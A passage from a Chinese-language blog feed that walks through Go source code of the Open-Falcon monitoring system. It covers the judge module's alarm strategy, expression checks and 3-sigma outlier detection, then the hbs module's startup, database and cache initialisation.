如果这个keys存在了则压入队列，如果不存在放入队列之后调用judge函数判断</span></span><br><span class="line"><span class="keyword">if</span> linkedList, exists := this.Get(key); exists &#123;</span><br><span class="line">needJudge := linkedList.PushFrontAndMaintain(val, maxCount)</span><br><span class="line"><span class="keyword">if</span> needJudge &#123;</span><br><span class="line">Judge(linkedList, val, now)</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">NL := list.New()</span><br><span class="line">NL.PushFront(val)</span><br><span class="line">safeList := &amp;SafeLinkedList&#123;L: NL&#125;</span><br><span class="line">this.Set(key, safeList)</span><br><span class="line">Judge(safeList, val, now)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>检查Strategy和expression:</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Judge</span><span class="params">(L *SafeLinkedList, firstItem *model.JudgeItem, now <span class="keyword">int64</span>)</span></span> &#123;</span><br><span class="line">CheckStrategy(L, firstItem, now)</span><br><span class="line">CheckExpression(L, firstItem, now)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">CheckStrategy</span><span class="params">(L *SafeLinkedList, firstItem *model.JudgeItem, now <span class="keyword">int64</span>)</span></span> &#123;</span><br><span class="line">key := fmt.Sprintf(<span class="string">"%s/%s"</span>, firstItem.Endpoint, firstItem.Metric)</span><br><span class="line">strategyMap := g.StrategyMap.Get()</span><br><span class="line">strategies, exists := strategyMap[key]</span><br><span class="line"><span class="keyword">if</span> !exists &#123;</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _, s := <span class="keyword">range</span> strategies &#123;</span><br><span class="line"><span class="comment">// 因为key仅仅是endpoint和metric，所以得到的strategies并不一定是与当前judgeItem相关的</span></span><br><span class="line"><span class="comment">// 比如lg-dinp-docker01.bj配置了两个proc.num的策略，一个name=docker，一个name=agent</span></span><br><span class="line"><span class="comment">// 所以此处要排除掉一部分</span></span><br><span class="line">related := <span class="literal">true</span></span><br><span class="line"><span class="keyword">for</span> tagKey, tagVal := <span class="keyword">range</span> s.Tags &#123;</span><br><span class="line"><span class="keyword">if</span> myVal, exists := firstItem.Tags[tagKey]; !exists || myVal != tagVal &#123;</span><br><span class="line">related = <span class="literal">false</span></span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 查找到相关的指标，然后judge对应的策略</span></span><br><span class="line"><span class="keyword">if</span> !related &#123;</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">judgeItemWithStrategy(L, s, firstItem, now)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>judgeItemWithStrategy函数寻找相应的策略：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">judgeItemWithStrategy</span><span class="params">(L *SafeLinkedList, strategy model.Strategy, firstItem *model.JudgeItem, now <span class="keyword">int64</span>)</span></span> &#123;</span><br><span class="line">fn, err := ParseFuncFromString(strategy.Func, strategy.Operator, strategy.RightValue)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Printf(<span class="string">"[ERROR] parse func %s fail: %v. strategy id: %d"</span>, strategy.Func, err, strategy.Id)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//判断是否需要触发，如果满足条件，则发送事件</span></span><br><span class="line">historyData, leftValue, isTriggered, isEnough := fn.Compute(L)</span><br><span class="line"><span class="keyword">if</span> !isEnough &#123;</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">event := &amp;model.Event&#123;</span><br><span class="line">Id:         fmt.Sprintf(<span class="string">"s_%d_%s"</span>, strategy.Id, firstItem.PrimaryKey()),</span><br><span class="line">Strategy:   &amp;strategy,</span><br><span class="line">Endpoint:   firstItem.Endpoint,</span><br><span class="line">LeftValue:  leftValue,</span><br><span class="line">EventTime:  firstItem.Timestamp,</span><br><span class="line">PushedTags: firstItem.Tags,</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 发送事件</span></span><br><span class="line">sendEventIfNeed(historyData, isTriggered, now, event, strategy.MaxStep)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">sendEventIfNeed</span><span class="params">(historyData []*model.HistoryData, isTriggered <span class="keyword">bool</span>, now <span class="keyword">int64</span>, event *model.Event, maxStep <span class="keyword">int</span>)</span></span> &#123;</span><br><span class="line">lastEvent, exists := g.LastEvents.Get(event.Id)</span><br><span class="line"><span class="keyword">if</span> isTriggered &#123;</span><br><span class="line">event.Status = <span class="string">"PROBLEM"</span></span><br><span class="line"><span class="keyword">if</span> !exists || lastEvent.Status[<span class="number">0</span>] == <span class="string">'O'</span> &#123;</span><br><span class="line"><span class="comment">// 本次触发了阈值，之前又没报过警，得产生一个报警Event</span></span><br><span class="line">event.CurrentStep = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 但是有些用户把最大报警次数配置成了0，相当于屏蔽了，要检查一下</span></span><br><span class="line"><span class="keyword">if</span> maxStep == <span class="number">0</span> &#123;</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">sendEvent(event)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 逻辑走到这里，说明之前Event是PROBLEM状态</span></span><br><span class="line"><span class="keyword">if</span> lastEvent.CurrentStep &gt;= maxStep &#123;</span><br><span class="line"><span class="comment">// 报警次数已经足够多，到达了最多报警次数了，不再报警</span></span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> historyData[<span class="built_in">len</span>(historyData)<span class="number">-1</span>].Timestamp &lt;= lastEvent.EventTime &#123;</span><br><span class="line"><span class="comment">// 产生过报警的点，就不能再使用来判断了，否则容易出现一分钟报一次的情况</span></span><br><span class="line"><span class="comment">// 只需要拿最后一个historyData来做判断即可，因为它的时间最老</span></span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> now-lastEvent.EventTime &lt; g.Config().Alarm.MinInterval &#123;</span><br><span class="line"><span class="comment">// 报警不能太频繁，两次报警之间至少要间隔MinInterval秒，否则就不能报警</span></span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">event.CurrentStep = lastEvent.CurrentStep + <span class="number">1</span></span><br><span class="line">sendEvent(event) <span class="comment">//发送事件，函数将报警事件存储到redis队列中去。</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="comment">// 如果LastEvent是Problem，报OK，否则啥都不做</span></span><br><span class="line"><span class="keyword">if</span> exists &amp;&amp; lastEvent.Status[<span class="number">0</span>] == <span class="string">'P'</span> &#123;</span><br><span class="line">event.Status = <span class="string">"OK"</span></span><br><span class="line">event.CurrentStep = <span class="number">1</span></span><br><span class="line">sendEvent(event)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>检查表达式是否满足要求：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">CheckExpression</span><span class="params">(L *SafeLinkedList, firstItem *model.JudgeItem, now <span class="keyword">int64</span>)</span></span> &#123;</span><br><span class="line">keys := buildKeysFromMetricAndTags(firstItem)</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(keys) == <span class="number">0</span> &#123;</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// expression可能会被多次重复处理，用此数据结构保证只被处理一次</span></span><br><span class="line">handledExpression := <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="keyword">int</span>]<span class="keyword">struct</span>&#123;&#125;)</span><br><span class="line"></span><br><span class="line">expressionMap := g.ExpressionMap.Get()</span><br><span class="line"><span class="keyword">for</span> _, key := <span class="keyword">range</span> keys &#123;</span><br><span class="line">expressions, exists := expressionMap[key]</span><br><span class="line"><span class="keyword">if</span> !exists &#123;</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//过滤相关表达式</span></span><br><span class="line">related := filterRelatedExpressions(expressions, firstItem)</span><br><span class="line"><span class="keyword">for</span> _, exp := <span class="keyword">range</span> related &#123;</span><br><span class="line"><span class="keyword">if</span> _, ok := handledExpression[exp.Id]; ok &#123;</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">&#125;</span><br><span class="line">handledExpression[exp.Id] = <span class="keyword">struct</span>&#123;&#125;&#123;&#125;</span><br><span class="line">judgeItemWithExpression(L, exp, firstItem, now)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>类似的满足要求发送事件给redis：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">judgeItemWithExpression</span><span class="params">(L *SafeLinkedList, expression *model.Expression, firstItem *model.JudgeItem, now <span class="keyword">int64</span>)</span></span> &#123;</span><br><span class="line">fn, err := ParseFuncFromString(expression.Func, expression.Operator, expression.RightValue)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Printf(<span class="string">"[ERROR] parse func %s fail: %v. expression id: %d"</span>, expression.Func, err, expression.Id)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">historyData, leftValue, isTriggered, isEnough := fn.Compute(L)</span><br><span class="line"><span class="keyword">if</span> !isEnough &#123;</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">event := &amp;model.Event&#123;</span><br><span class="line">Id:         fmt.Sprintf(<span class="string">"e_%d_%s"</span>, expression.Id, firstItem.PrimaryKey()),</span><br><span class="line">Expression: expression,</span><br><span class="line">Endpoint:   firstItem.Endpoint,</span><br><span class="line">LeftValue:  leftValue,</span><br><span class="line">EventTime:  firstItem.Timestamp,</span><br><span class="line">PushedTags: firstItem.Tags,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">sendEventIfNeed(historyData, isTriggered, now, event, expression.MaxStep)</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中使用fn.Compute使用的是离群点检测函数，更多请参考3-sigma算法，<a href="https://en.wikipedia.org/wiki/68%E2%80%9395%E2%80%9399.7_rule" target="_blank" rel="noopener">https://en.wikipedia.org/wiki/68%E2%80%9395%E2%80%9399.7_rule</a><br>stddev(#10) = 3 //取最新 <strong>10</strong> 个点的数据分别计算得到他们的标准差和均值，分别计为 σ 和 μ，其中当前值计为 X，那么当 X 落在区间 [μ-3σ, μ+3σ] 之外时则报警。</p><p>接下来SyncStrategies函数从HBS同步策略：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">SyncStrategies</span><span class="params">()</span></span> &#123;</span><br><span class="line">duration := time.Duration(g.Config().Hbs.Interval) * time.Second</span><br><span class="line"><span class="keyword">for</span> &#123;</span><br><span class="line">syncStrategies()   <span class="comment">//同步策略</span></span><br><span class="line">syncExpression()   <span class="comment">//同步表达式</span></span><br><span class="line">syncFilter()       <span class="comment">//同步过滤器</span></span><br><span class="line">time.Sleep(duration)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">syncStrategies</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">var</span> strategiesResponse model.StrategiesResponse</span><br><span class="line">err := g.HbsClient.Call(<span class="string">"Hbs.GetStrategies"</span>, model.NullRpcRequest&#123;&#125;, &amp;strategiesResponse)  <span class="comment">//调用HBS rpc接口数据数据</span></span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Println(<span class="string">"[ERROR] Hbs.GetStrategies:"</span>, err)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">rebuildStrategyMap(&amp;strategiesResponse)  <span class="comment">//重建策略数据结构</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">syncExpression</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">var</span> expressionResponse model.ExpressionResponse</span><br><span class="line">err := g.HbsClient.Call(<span class="string">"Hbs.GetExpressions"</span>, model.NullRpcRequest&#123;&#125;, &amp;expressionResponse)   <span class="comment">//调用HBS接口返回数据</span></span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Println(<span class="string">"[ERROR] Hbs.GetExpressions:"</span>, err)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">rebuildExpressionMap(&amp;expressionResponse)  <span class="comment">// 重建表达式数据结构</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">syncFilter</span><span class="params">()</span></span> &#123;</span><br><span class="line">m := <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="keyword">string</span>]<span class="keyword">string</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">//M map[string][]model.Strategy</span></span><br><span class="line">strategyMap := g.StrategyMap.Get()</span><br><span class="line"><span class="keyword">for</span> _, strategies := <span class="keyword">range</span> strategyMap &#123;</span><br><span class="line"><span class="keyword">for</span> _, strategy := <span class="keyword">range</span> strategies &#123;</span><br><span class="line">m[strategy.Metric] = strategy.Metric</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//M map[string][]*model.Expression</span></span><br><span class="line">expressionMap := g.ExpressionMap.Get()</span><br><span class="line"><span class="keyword">for</span> _, expressions := <span class="keyword">range</span> expressionMap &#123;</span><br><span class="line"><span class="keyword">for</span> _, expression := <span class="keyword">range</span> expressions &#123;</span><br><span class="line">m[expression.Metric] = expression.Metric</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">g.FilterMap.ReInit(m)  <span class="comment">// 设置获取到的map数据结构</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;open-falcon-judge源码分析&quot;&gt;&lt;a href=&quot;#open-falcon-judge源码分析&quot; class=&quot;headerlink&quot; title=&quot;open-falcon judge源码分析&quot;&gt;&lt;/a&gt;open-falcon judge源码分析&lt;/
      
    
    </summary>
    
    
      <category term="monitor" scheme="http://www.mydreamdll.xyz/categories/monitor/"/>
    
    
      <category term="monitor" scheme="http://www.mydreamdll.xyz/tags/monitor/"/>
    
  </entry>
  
  <entry>
    <title>open-falcon hbs 源码分析</title>
    <link href="http://www.mydreamdll.xyz/2020/01/21/hbs%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/"/>
    <id>http://www.mydreamdll.xyz/2020/01/21/hbs%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/</id>
    <published>2020-01-21T09:07:45.159Z</published>
    <updated>2020-01-21T09:06:11.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="open-falcon-hbs源码分析"><a href="#open-falcon-hbs源码分析" class="headerlink" title="open-falcon hbs源码分析"></a>open-falcon hbs源码分析</h2><p>本篇文章主要分析下open-falcon中hbs如何实现的：</p><p>主流程再modules/hbs/main.go模块中：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">g.BinaryName = BinaryName</span><br><span class="line">g.Version = Version</span><br><span class="line">g.GitCommit = GitCommit</span><br><span class="line"></span><br><span class="line">cfg := flag.String(<span class="string">"c"</span>, <span class="string">"cfg.json"</span>, <span class="string">"configuration file"</span>)</span><br><span class="line">version := flag.Bool(<span class="string">"v"</span>, <span class="literal">false</span>, <span class="string">"show version"</span>)</span><br><span class="line">flag.Parse()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> *version &#123;</span><br><span class="line">fmt.Printf(<span class="string">"Open-Falcon %s version %s, build %s\n"</span>, BinaryName, Version, GitCommit)</span><br><span class="line">os.Exit(<span class="number">0</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 解析配置文件</span></span><br><span class="line">g.ParseConfig(*cfg)</span><br><span class="line"><span class="comment">// 初始化数据库，检查数据库是否可以连接，连接失败退出。</span></span><br><span class="line">db.Init()</span><br><span class="line">    <span class="comment">// 初始化缓存，从数据库中查询数据加载到缓存中。</span></span><br><span class="line">cache.Init()</span><br><span class="line"><span class="comment">// 删除没有心跳的agent</span></span><br><span class="line"><span class="keyword">go</span> cache.DeleteStaleAgents()</span><br><span class="line"><span class="comment">// 启动hbs http服务</span></span><br><span class="line"><span class="keyword">go</span> http.Start()</span><br><span class="line">    <span class="comment">// 启动 rpc服务</span></span><br><span class="line"><span class="keyword">go</span> rpc.Start()</span><br><span class="line"></span><br><span class="line">    <span class="comment">//信号量检查</span></span><br><span class="line">sigs := <span class="built_in">make</span>(<span class="keyword">chan</span> os.Signal, <span class="number">1</span>)</span><br><span class="line">signal.Notify(sigs, syscall.SIGINT, syscall.SIGTERM)</span><br><span class="line"><span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">&lt;-sigs</span><br><span class="line">fmt.Println()</span><br><span class="line">db.DB.Close()</span><br><span class="line">os.Exit(<span class="number">0</span>)</span><br><span class="line">&#125;()</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>db初始化函数Init:</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Init</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">var</span> err error</span><br><span class="line">DB, err = sql.Open(<span class="string">"mysql"</span>, g.Config().Database)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Fatalln(<span class="string">"open db fail:"</span>, err)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">DB.SetMaxOpenConns(g.Config().MaxConns)</span><br><span class="line">DB.SetMaxIdleConns(g.Config().MaxIdle)</span><br><span class="line"></span><br><span class="line">err = DB.Ping()</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Fatalln(<span class="string">"ping db fail:"</span>, err)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>初始化缓存数据：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Init</span><span class="params">()</span></span> &#123;</span><br><span class="line">log.Println(<span class="string">"cache begin"</span>)</span><br><span class="line"><span class="comment">// 查询group与plugins的关系到缓存中</span></span><br><span class="line">log.Println(<span class="string">"#1 GroupPlugins..."</span>)</span><br><span class="line">GroupPlugins.Init()</span><br><span class="line"><span class="comment">// 查询group与template的关系到缓存中</span></span><br><span class="line">log.Println(<span class="string">"#2 GroupTemplates..."</span>)</span><br><span class="line">GroupTemplates.Init()</span><br><span class="line"><span class="comment">// 查询host与group的关系到缓存中</span></span><br><span class="line">log.Println(<span class="string">"#3 HostGroupsMap..."</span>)</span><br><span class="line">HostGroupsMap.Init()</span><br><span class="line"><span class="comment">//查询所有的host信息到缓存，方便查询hostname-&gt;id</span></span><br><span class="line">log.Println(<span class="string">"#4 HostMap..."</span>)</span><br><span class="line">HostMap.Init()</span><br><span class="line"><span class="comment">//查询所有的template信息到缓存中</span></span><br><span class="line">log.Println(<span class="string">"#5 TemplateCache..."</span>)</span><br><span class="line">TemplateCache.Init()</span><br><span class="line"><span class="comment">//查询对应模块的策略信息到缓存中</span></span><br><span class="line">log.Println(<span class="string">"#6 Strategies..."</span>)</span><br><span class="line">Strategies.Init(TemplateCache.GetMap())</span><br><span class="line"><span class="comment">//查询host与template的缓存信息，一个id对应多个模块ID</span></span><br><span class="line">log.Println(<span class="string">"#7 HostTemplateIds..."</span>)</span><br><span class="line">HostTemplateIds.Init()</span><br><span class="line"><span class="comment">//查询所有表达式到缓存中</span></span><br><span class="line">log.Println(<span class="string">"#8 ExpressionCache..."</span>)</span><br><span class="line">ExpressionCache.Init()</span><br><span class="line"><span class="comment">// 查询被监控的host信息缓存</span></span><br><span class="line">log.Println(<span class="string">"#9 MonitoredHosts..."</span>)</span><br><span class="line">MonitoredHosts.Init()</span><br><span class="line"></span><br><span class="line">log.Println(<span class="string">"cache done"</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">go</span> LoopInit() <span class="comment">//定时查询更新，比较消耗资源。</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>定时检查当前agents列表中的信息心跳最后更新时间：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">deleteStaleAgents</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="comment">// 一天都没有心跳的Agent，从内存中干掉</span></span><br><span class="line">before := time.Now().Unix() - <span class="number">3600</span>*<span class="number">24</span></span><br><span class="line">keys := Agents.Keys()</span><br><span class="line">count := <span class="built_in">len</span>(keys)</span><br><span class="line"><span class="keyword">if</span> count == <span class="number">0</span> &#123;</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i := <span class="number">0</span>; i &lt; count; i++ &#123;</span><br><span class="line">curr, _ := Agents.Get(keys[i])</span><br><span class="line"><span class="keyword">if</span> curr.LastUpdate 